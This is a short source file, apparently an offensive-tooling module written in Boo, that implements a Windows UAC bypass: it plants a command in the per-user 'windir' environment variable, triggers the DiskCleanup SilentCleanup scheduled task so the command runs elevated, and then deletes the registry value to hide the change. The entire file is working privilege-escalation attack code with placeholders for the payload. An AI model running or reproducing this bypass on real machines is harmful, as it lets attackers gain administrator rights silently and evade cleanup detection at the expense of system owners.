import Microsoft.Win32
import System
import System.Diagnostics
import System.Threading

public static def BypassUAC(binary as string, arguments as string, path as string):
		Console.WriteLine('[+] Starting Bypass UAC.')
		if binary.Length > 0:
			Console.WriteLine(('[+] Payload to be Executed ' + path + binary + arguments))
		try:
			registryKey as RegistryKey = Registry.CurrentUser.CreateSubKey('Environment')
			registryKey.SetValue('windir', ((path + binary + arguments) + ' & '), RegistryValueKind.String)
			registryKey.Close()
			Console.WriteLine('[+] Enviroment Variabled %windir% Created.')
		except :
			Console.WriteLine('[-] Unable to Create the Enviroment Variabled %windir%.')
			Console.WriteLine('[-] Exit.')
		Console.WriteLine('[+] Waiting 5 seconds before execution.')
		Thread.Sleep(5000)
		try:
			processStartInfo = ProcessStartInfo()
			processStartInfo.CreateNoWindow = true
			processStartInfo.UseShellExecute = false
			processStartInfo.FileName = 'schtasks.exe'
			processStartInfo.Arguments = '/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I'
			Process.Start(processStartInfo)
			Console.WriteLine('[+] UAC Bypass Application Executed.')
		except :
			Console.WriteLine('[-] Unable to Execute the Application schtasks.exe to perform the bypass.')
		DeleteKey()
		Console.WriteLine('[-] Exit.');

public static def DeleteKey():
		Console.WriteLine('[+] Registry Cleaning will start in 5 seconds.')
		Thread.Sleep(5000)
		try:
			registryKey as RegistryKey = Registry.CurrentUser.OpenSubKey('Environment', true)
			if registryKey is not null:
				try:
					registryKey.DeleteValue('windir')
					registryKey.Close()
				except ex as Exception:
					Console.WriteLine(('[-] Unable to Delete the Registry key (Environment). Error ' + ex.Message))
			Console.WriteLine('[+] Registry Cleaned.')
		except :
			Console.WriteLine('[-] Unable to Clean the Registry.')
	

public static def Main():
	binary = "BINARY "
	arguments = "ARGUMENTS"
	path = `PATH`
	BypassUAC(binary, arguments, path)
